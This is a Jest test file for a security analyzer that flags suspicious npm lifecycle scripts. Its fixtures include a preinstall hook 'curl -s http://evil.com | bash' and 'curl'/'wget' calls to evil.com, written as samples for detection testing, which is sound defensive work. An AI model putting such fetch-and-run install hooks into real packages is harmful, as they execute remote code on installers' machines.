import { describe, it, expect } from "@jest/globals";
import { ScriptsAnalyzer } from "../../../src/analyzers/scripts";

describe("ScriptsAnalyzer", () => {
  const analyzer = new ScriptsAnalyzer();

  it("should detect suspicious preinstall script", () => {
    const issues = analyzer.analyze({
      name: "test-package",
      version: "1.0.0",
      path: "/tmp/test",
      packageJson: {
        scripts: {
          preinstall: "curl -s http://evil.com | bash",
          test: "jest",
        },
      },
      config: {},
    });

    expect(issues.length).toBeGreaterThan(0);
    expect(issues[0].type).toBe("scripts");
    expect(issues[0].message).toContain("preinstall");
    expect(issues[0].severity).toBe("medium");
  });

  it("should detect multiple suspicious lifecycle scripts", () => {
    const issues = analyzer.analyze({
      name: "test-package",
      version: "1.0.0",
      path: "/tmp/test",
      packageJson: {
        scripts: {
          preinstall: "curl evil.com",
          postinstall: "wget evil.com",
          install: "node script.js",
        },
      },
      config: {},
    });

    expect(issues.length).toBe(3);
  });

  it("should not flag safe scripts", () => {
    const issues = analyzer.analyze({
      name: "test-package",
      version: "1.0.0",
      path: "/tmp/test",
      packageJson: {
        scripts: {
          test: "jest",
          build: "tsc",
          start: "node dist/index.js",
        },
      },
      config: {},
    });

    expect(issues.length).toBe(0);
  });

  it("should handle package with no scripts", () => {
    const issues = analyzer.analyze({
      name: "test-package",
      version: "1.0.0",
      path: "/tmp/test",
      packageJson: {},
      config: {},
    });

    expect(issues.length).toBe(0);
  });
});
